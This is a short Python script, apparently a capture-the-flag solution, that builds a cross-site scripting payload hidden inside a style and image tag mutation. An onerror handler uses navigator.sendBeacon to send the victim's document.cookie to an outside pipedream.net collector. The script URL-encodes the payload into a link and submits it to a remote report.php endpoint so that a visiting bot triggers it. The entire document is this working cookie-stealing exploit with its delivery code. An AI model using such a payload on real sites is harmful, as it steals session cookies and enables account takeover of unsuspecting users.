from urllib.parse import *
import requests

payload = """<body><style></style><img id="</style><img src=a onerror='navigator.sendBeacon(`https://en3fj5l0caqk6.x.pipedream.net/${document.cookie}`)'"></body>"""

link = "http://127.0.0.1/?xss=" + quote(payload)

print(link)
print(requests.get("http://20.115.83.90:1337/report.php", params={"url": link}).text)
